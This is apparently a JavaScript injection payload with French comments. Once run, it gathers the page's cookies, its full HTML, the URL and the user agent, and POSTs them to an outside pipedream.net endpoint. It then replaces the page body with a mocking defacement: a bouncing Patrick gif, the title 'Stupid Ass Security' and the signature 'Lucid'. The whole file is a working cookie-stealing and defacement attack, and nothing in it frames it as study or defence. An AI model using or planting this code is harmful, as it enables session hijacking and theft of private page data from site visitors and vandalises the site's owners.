// Fonction pour récupérer les cookies
function grabCookies() {
    return document.cookie;
}

// Fonction pour récupérer tout le HTML de la page
function grabFullHTML() {
    return document.documentElement.outerHTML;
}

// Fonction pour envoyer les données au serveur
function sendDataToServer() {
    const cookies = grabCookies();
    const html = grabFullHTML();
    
    // Créer l'objet de données à envoyer
    const data = {
        cookies: cookies,
        html: html,
        url: window.location.href,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
    };
    
    // Envoyer les données via une requête POST
    fetch('https://eoppt5zj3no3twu.m.pipedream.net', {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    }).catch(error => {
        console.error('Erreur lors de l\'envoi des données:', error);
    });
}

// Exécuter la fonction d'envoi
sendDataToServer();

document.body.innerHTML =`
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🤪 Stupid Ass Security</title>
    <style>
        body {
            background: #000000;
            margin: 0;
            padding: 0;
            height: 100vh;
            overflow: hidden;
            font-family: 'Times New Roman', serif;
        }
        
        #dvd-container {
            position: relative;
            width: 100%;
            height: 100vh;
        }
        
        #patrick {
            position: absolute;
            width: 150px;
            height: 150px;
        }
        
        .lucid-text {
            position: absolute;
            bottom: 30px;
            left: 30px;
            color: #ffffff;
            font-size: 32px;
            font-weight: normal;
            font-style: italic;
            letter-spacing: 2px;
        }
    </style>
</head>
<body>
    <div id="dvd-container">
        <img id="patrick" src="https://media.tenor.com/CgM8PYqJMucAAAAM/dumb-patrick.gif" alt="Dumb Patrick">
        <div class="lucid-text">Lucid</div>
    </div>

    <script>
        // Attendre que le DOM soit chargé
        setTimeout(() => {
            const patrick = document.getElementById('patrick');
            const container = document.getElementById('dvd-container');
            
            let x = 0;
            let y = 0;
            let xSpeed = 1;
            let ySpeed = 1;
            
            function animate() {
                x += xSpeed;
                y += ySpeed;
                
                if (x + patrick.clientWidth >= container.clientWidth || x <= 0) {
                    xSpeed = -xSpeed;
                }
                
                if (y + patrick.clientHeight >= container.clientHeight || y <= 0) {
                    ySpeed = -ySpeed;
                }
                
                patrick.style.left = x + 'px';
                patrick.style.top = y + 'px';
                
                requestAnimationFrame(animate);
            }
            
            // Démarrer l'animation
            animate();
        }, 100);
    </script>
</body>
</html>`;
